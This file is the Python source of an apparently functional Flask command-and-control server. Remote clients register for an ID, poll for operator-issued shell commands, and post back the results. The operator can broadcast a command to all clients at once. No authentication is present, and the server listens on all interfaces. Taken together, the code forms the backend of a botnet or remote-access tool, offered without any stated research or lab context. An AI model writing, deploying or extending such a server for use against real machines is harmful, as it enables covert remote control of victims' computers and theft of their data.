from flask import Flask, request, render_template, jsonify
import uuid, json, os, signal, sys, time

app = Flask(__name__)
CLIENT_FILE = "clients.json"
CLIENT_TIMEOUT = 60  


clients = {}
if os.path.exists(CLIENT_FILE):
    try:
        with open(CLIENT_FILE, "r") as f:
            clients = json.load(f)
    except (json.JSONDecodeError, ValueError):
        clients = {}

for cid, data in clients.items():
    if "last_seen" not in data:
        clients[cid]["last_seen"] = time.time()

def save_clients():
    with open(CLIENT_FILE, "w") as f:
        json.dump(clients, f, indent=4)

def remove_disconnected():
    now = time.time()
    removed = []
    for cid in list(clients.keys()):
        if now - clients[cid].get("last_seen", 0) > CLIENT_TIMEOUT:
            removed.append(cid)
            del clients[cid]
    if removed:
        print(f"[!] Removed disconnected clients: {removed}")
        save_clients()

def handle_exit(signum, frame):
    print("\n[!] Saving clients before exit...")
    save_clients()
    sys.exit(0)

signal.signal(signal.SIGINT, handle_exit)
signal.signal(signal.SIGTERM, handle_exit)

@app.route("/")
def index():
    remove_disconnected()
    return render_template("index.html", clients=list(clients.keys()))

@app.route("/register_client", methods=["POST"])
def register_client():
    client_id = str(uuid.uuid4())
    clients[client_id] = {"cmd": "", "output": "No output yet.", "last_seen": time.time()}
    save_clients()
    return client_id

@app.route("/send_command", methods=["POST"])
def send_command():
    remove_disconnected()
    target = request.form.get("client_id")
    cmd = request.form.get("command", "").strip()
    if not cmd:
        return "No command"
    if target == "ALL":
        for cid in clients:
            clients[cid]["cmd"] = cmd
    elif target in clients:
        clients[target]["cmd"] = cmd
    save_clients()
    return "ok"

@app.route("/commands")
def commands():
    remove_disconnected()
    client_id = request.args.get("client_id")
    if client_id == "ALL":
        return ""
    if client_id in clients:
        clients[client_id]["last_seen"] = time.time()
        cmd = clients[client_id]["cmd"]
        clients[client_id]["cmd"] = ""
        save_clients()
        return cmd
    return ""

@app.route("/results", methods=["POST"])
def results():
    client_id = request.form.get("client_id")
    result = request.form.get("result", "").strip()
    if client_id in clients:
        clients[client_id]["output"] = result or "No output"
        clients[client_id]["last_seen"] = time.time()
        save_clients()
    return "ok"

@app.route("/get_output")
def get_output():
    remove_disconnected()
    client_id = request.args.get("client_id")
    if client_id == "ALL":
        combined = "\n".join(f"[{cid}]:\n{clients[cid]['output']}" for cid in clients)
        return jsonify({"output": combined})
    if client_id in clients:
        return jsonify({"output": clients[client_id]["output"]})
    return jsonify({"output": ""})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
